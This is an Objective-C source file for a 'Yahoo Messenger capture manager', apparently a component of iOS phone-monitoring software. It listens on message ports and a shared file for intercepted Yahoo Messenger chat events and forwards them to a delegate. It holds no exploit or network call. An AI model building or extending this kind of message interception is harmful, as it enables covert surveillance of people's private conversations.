//
//  YahooMsgCaptureManager.m
//  YahooMsgCaptureManager
//
//  Created by Benjawan Tanarattanakorn on 3/26/2557 BE.
//
//

#import "YahooMsgCaptureManager.h"

#import <UIKit/UIKit.h>

#import "DefStd.h"
#import "FxIMEvent.h"
#import "FxIMEventUtils.h"

@implementation YahooMsgCaptureManager

@synthesize mEventDelegate;

- (id)init
{
    self = [super init];
    if (self) {
        
    }
    return self;
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
	[self setMEventDelegate:aEventDelegate];
}

- (void) unregisterEventDelegate {
	[self setMEventDelegate:nil];
}


- (void) startCapture {
	DLog (@"Start capture Yahoo messenger");
	if (!mMessagePortReader1) {
		mMessagePortReader1 = [[MessagePortIPCReader alloc] initWithPortName:kYahooMsgMessagePort1
                                                  withMessagePortIPCDelegate:self];
		[mMessagePortReader1 start];
	}
	if (!mMessagePortReader2) {
		mMessagePortReader2 = [[MessagePortIPCReader alloc] initWithPortName:kYahooMsgMessagePort2
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader2 start];
	}
	if (!mMessagePortReader3) {
		mMessagePortReader3 = [[MessagePortIPCReader alloc] initWithPortName:kYahooMsgMessagePort3
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader3 start];
	}
	
	if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
		if (mSharedFileReader1 == nil) {
			mSharedFileReader1 = [[SharedFile2IPCReader alloc] initWithSharedFileName:kYahooMsgMessagePort1
																		 withDelegate:self];
			[mSharedFileReader1 start];
		}
	}
}


- (void) stopCapture {
	DLog (@"Stop capture Yahoo messenger");
	if (mMessagePortReader1) {
		[mMessagePortReader1 stop];
		[mMessagePortReader1 release];
		mMessagePortReader1 = nil;
	}
	if (mMessagePortReader2) {
		[mMessagePortReader2 stop];
		[mMessagePortReader2 release];
		mMessagePortReader2 = nil;
	}
	if (mMessagePortReader3) {
		[mMessagePortReader3 stop];
		[mMessagePortReader3 release];
		mMessagePortReader3 = nil;
	}
	
	if (mSharedFileReader1 != nil) {
		[mSharedFileReader1 stop];
		[mSharedFileReader1 release];
		mSharedFileReader1 = nil;
	}
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSKeyedUnarchiver *unarchiver   = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    FxIMEvent *imEvent              = [unarchiver decodeObjectForKey:kYahooMsgArchived];
	DLog(@"Yahoo Messenger - imEvent = %@", imEvent)
    [unarchiver finishDecoding];
    
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		NSArray *imStructureEvents  = [FxIMEventUtils digestIMEvent:imEvent];
		for (FxEvent *imStructureEvent in imStructureEvents) {
			DLog (@"sending %@ ...", imStructureEvent)
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:imStructureEvent];
		}
	}
	[unarchiver release];
}

- (void) dataDidReceivedFromSharedFile2: (NSData*) aRawData {
	[self dataDidReceivedFromMessagePort:aRawData];
}

- (void) dealloc {
	[self stopCapture];
	[super dealloc];
}

@end
